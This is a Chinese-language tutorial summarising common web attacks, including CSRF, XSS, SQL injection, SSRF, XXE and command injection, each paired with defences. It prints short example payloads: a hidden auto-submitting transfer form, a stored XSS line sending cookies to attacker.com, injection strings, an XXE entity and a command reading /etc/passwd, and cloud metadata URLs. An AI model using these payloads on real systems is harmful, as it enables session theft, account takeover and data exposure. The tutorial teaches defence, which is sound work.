---
title: 常见 Web 安全攻击总结：CSRF、XSS、SQL注入等
slug: web-security-attacks
date_published: 2026-06-24T00:00:00.000Z
date_updated: 2026-06-24T00:00:00.000Z
tags: ["web安全", "CSRF", "XSS", "SQL注入", "SSRF"]
---

## 一、CSRF（跨站请求伪造）

### 什么是 CSRF

CSRF（Cross-Site Request Forgery）指攻击者在用户已登录目标网站后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份发起伪造请求。

本质原因：**Web 的隐式身份验证机制**——服务器只能验证请求来自某个用户的浏览器，却无法保证请求是用户本人批准发送的。

### 攻击方式

**1. GET 型攻击**

利用 `<img>`、`<script>` 等标签的自动 GET 请求特性。例如某网站有关注用户的 GET 接口：

```html
<img src="https://example.com/follow?user_id=123" />
```

用户打开包含此图片的页面，浏览器自动发起请求，用户毫不知情。

**2. POST 型攻击**

构造隐藏表单，诱导用户访问。由于同源策略限制，不能在 iframe 内直接操作跨域内容，但可以通过**嵌套两层 iframe** 绕过：

- 外层页面嵌套一个指向内层页面的 iframe
- 内层页面执行 form.submit() 发起 POST
- 使用 form 而非 XHR 是因为 **form 可以跨域 POST 数据，而 Ajax 受同源策略限制**

```html
<!-- 攻击页面 -->
<iframe src="attack-form.html" style="display:none"></iframe>

<!-- attack-form.html -->
<form action="https://example.com/transfer" method="POST">
  <input name="to" value="attacker" />
  <input name="amount" value="10000" />
</form>
<script>document.forms[0].submit();</script>
```

**3. XSRF（XSS + CSRF 组合）**

如果目标网站存在 XSS 漏洞，攻击者可直接将恶意代码注入页面，用户访问后自动触发伪造请求，攻击更隐蔽且危害更大。

### 防御手段

| 手段 | 说明 | 可靠性 |
|------|------|--------|
| 尽量使用 POST | GET 接口太容易被利用，但 POST 也不是绝对安全 | 低 |
| 浏览器 Cookie 策略 | 依赖浏览器第三方 Cookie 拦截，不同浏览器策略不同 | 低 |
| 验证码 | 强制用户交互，但无法对所有操作加验证码 | 中（辅助） |
| Referer Check | 检查请求来源，但 Referer 不一定能取到 | 中（监控） |
| **Anti CSRF Token** | 业界主流方案，服务端生成随机 Token 验证 | **高** |

**Token 验证流程：**

1. 用户访问表单页面，服务端生成随机 Token 存入 Session
2. 页面表单附带 Token（通常通过 hidden input）
3. 用户提交表单时，Token 随表单一起发送到服务端
4. 服务端比对表单 Token 与 Session 中的 Token 是否一致

> **关键点：** Token 必须随机且不可预测。如果网站同时存在 XSS 漏洞，Token 方案形同虚设，因为攻击者可通过 XSS 读取 Token。

---

## 二、XSS（跨站脚本攻击）

### 什么是 XSS

XSS（Cross-Site Scripting）指攻击者将恶意脚本注入目标网站页面，当用户浏览该页面时，脚本在用户浏览器中执行。

### 三种类型

**1. 反射型 XSS（非持久型）**

恶意脚本通过 URL 参数等方式注入，服务端直接返回在响应中。通常需要诱导用户点击构造好的链接。

```
https://example.com/search?q=<script>alert(document.cookie)</script>
```

**2. 存储型 XSS（持久型）**

恶意脚本被存储到服务端数据库（如评论、用户昵称），当其他用户浏览该内容时触发。危害最大。

```
用户在评论区提交：<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>
```

**3. DOM 型 XSS**

通过修改页面的 DOM 环境来执行恶意脚本，全程在浏览器端发生，不经过服务端。

```javascript
// 页面代码
var name = location.hash.substring(1);
document.getElementById('greeting').innerHTML = 'Hello ' + name;

// 攻击链接
https://example.com/welcome#<img src=x onerror=alert(1)>
```

### 防御手段

- **输出编码：** 渲染时对 `< > " ' &` 等特殊字符进行 HTML 实体编码
- **输入校验：** 对用户输入做白名单校验
- **CSP（Content Security Policy）：** 通过 HTTP 头限制可执行的脚本来源
- **HttpOnly Cookie：** 设置 Cookie 的 HttpOnly 属性，防止 JavaScript 读取
- **使用安全的 DOM API：** 用 `textContent` 替代 `innerHTML`

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'
```

---

## 三、SQL 注入

### 什么是 SQL 注入

攻击者通过构造恶意的 SQL 参数，改变原本 SQL 语句的语义，从而执行非预期的数据库操作。

### 经典示例

```sql
-- 正常查询
SELECT * FROM users WHERE username = 'admin' AND password = '123456';

-- 攻击输入: username = admin' --
SELECT * FROM users WHERE username = 'admin' --' AND password = '123456';
-- -- 后的内容被注释，绕过了密码验证

-- 攻击输入: username = admin' OR '1'='1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'xxx';
-- OR '1'='1' 使得条件恒真
```

### 其他类型

- **盲注（Blind SQL Injection）：** 页面不返回错误信息，通过布尔逻辑或延时判断
- **联合查询注入：** 利用 UNION SELECT 获取其他表数据
- **堆叠查询：** 利用 `;` 执行多条 SQL 语句
- **二次注入：** 先将恶意数据存入数据库，后续查询时触发

### 防御手段

- **参数化查询（Prepared Statement）：** 最有效的手段
- **ORM 框架：** 使用成熟的 ORM 而非拼接 SQL
- **输入校验与过滤：** 对特殊字符转义
- **最小权限原则：** 数据库账号只授予必要的权限
- **WAF（Web Application Firewall）：** 拦截恶意请求

```java
// 错误做法——拼接 SQL
String sql = "SELECT * FROM users WHERE name = '" + userName + "'";

// 正确做法——参数化查询
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE name = ?");
stmt.setString(1, userName);
```

---

## 四、SSRF（服务端请求伪造）

### 什么是 SSRF

攻击者诱导服务端向内部系统发起请求，从而访问或操作原本无法从外部访问的内部资源。

### 攻击场景

```
攻击者 → 公网服务器 → 内网资源（数据库、Redis、文件系统、元数据服务等）
```

**常见攻击目标：**

- 云服务器元数据：`http://169.254.169.254/latest/meta-data/`
- 内网端口扫描
- 攻击内部 API（如 Redis `flushall`、`set` 写后门）
- 读取本地文件：`file:///etc/passwd`
- 利用 gopher/dict 等协议攻击内网服务

### 常见 SSRF 入口

- 图片/文件下载功能（URL 由用户提供）
- 远程资源代理/转发
- webhook 回调地址
- 在线翻译、识别等接受 URL 参数的功能

### 防御手段

- **白名单校验：** 限制可请求的目标域名/IP
- **禁用危险协议：** 只允许 http/https，禁用 `file://`、`gopher://`、`dict://` 等
- **过滤内网地址：** 禁止访问 `127.0.0.1`、`10.0.0.0/8`、`172.16.0.0/12`、`192.168.0.0/16`
- **限制重定向：** 禁止跟随 30x 跳转，防止绕过检查
- **使用代理隔离：** 将外网请求走独立的外网代理，与内网隔离
- **响应过滤：** 不直接返回远程资源内容

---

## 五、其他常见 Web 攻击

### 1. 点击劫持（Clickjacking）

通过透明的 iframe 覆盖在正常按钮上方，诱导用户点击。用户以为点击的是"播放"按钮，实际点击的是隐藏在下面的"删除"按钮。

**防御：** 设置 `X-Frame-Options: DENY` 或使用 CSP `frame-ancestors 'none'`

### 2. DOS / DDOS

**DOS（拒绝服务）：** 通过大量请求耗尽服务器资源
**DDOS（分布式拒绝服务）：** 利用僵尸网络发起攻击

**常见类型：**
- **SYN Flood：** 大量半连接耗尽连接表
- **HTTP Flood：** 大量 HTTP 请求耗尽应用层资源
- **Slowloris：** 慢速发送 HTTP Header，占用连接
- **反射放大攻击（如 NTP/DNS/Memcached）：** 伪造源 IP 向公共服务发送小请求，产生大响应

**防御：** CDN/高防 IP、限流、WAF、SYN Cookie、反向代理

### 3. 文件上传漏洞

攻击者上传可执行脚本（如 PHP、JSP webshell）到服务器，从而获取服务器控制权。

**防御：**
- 文件类型白名单
- 检查文件内容（Magic Number）而非仅依赖扩展名
- 上传目录禁止执行脚本权限
- 重命名上传的文件
- 存储到独立域名/对象存储

### 4. 越权漏洞

- **水平越权：** 同权限等级用户访问他人数据（A 用户查看到 B 用户的订单）
- **垂直越权：** 低权限用户执行高权限操作（普通用户调用管理接口）

**防御：** 所有接口做权限校验，不要仅依赖前端隐藏菜单

### 5. XXE（XML 外部实体注入）

在解析 XML 时注入外部实体，可能读取文件、发起 SSRF 或执行 DOS。

```xml
<!-- 攻击 payload -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>
```

**防御：** 禁用 XML 外部实体解析（DTD），使用 JSON 替代 XML

### 6. 反序列化漏洞

将不可信数据反序列化时触发恶意代码执行。Java、PHP、Python（pickle）均存在此风险。

**防御：** 不使用有风险的序列化协议，对反序列化数据做类型白名单，使用安全的序列化格式（如 JSON）

### 7. 命令注入

用户输入被拼接到系统命令中执行。

```bash
# 攻击者输入 ping 目标：127.0.0.1; cat /etc/passwd
ping -c 3 127.0.0.1; cat /etc/passwd
```

**防御：** 避免拼接命令字符串，使用参数化 API，对输入做严格过滤

---

## 总结

| 攻击类型 | 本质 | 核心防御 |
|---------|------|---------|
| CSRF | 利用浏览器自动携带凭证 | Anti CSRF Token |
| XSS | 注入恶意脚本到页面 | 输出编码 + CSP |
| SQL 注入 | 拼接恶意 SQL 语句 | 参数化查询 |
| SSRF | 诱导服务端请求内网 | 白名单 + 禁用危险协议 |
| 点击劫持 | 透明 iframe 覆盖诱导 | X-Frame-Options |
| 文件上传 | 上传可执行脚本 | 类型白名单 + 权限隔离 |
| 越权 | 缺少权限校验 | 接口级权限控制 |
| XXE | XML 外部实体注入 | 禁用 DTD 解析 |
| 命令注入 | 用户输入拼接到命令 | 参数化 API |

**Web 安全的黄金法则：永远不要信任用户输入。** 所有的输入校验、输出编码、权限检查、Token 验证，归根结底都是在"不信任"的前提下建立防御体系。
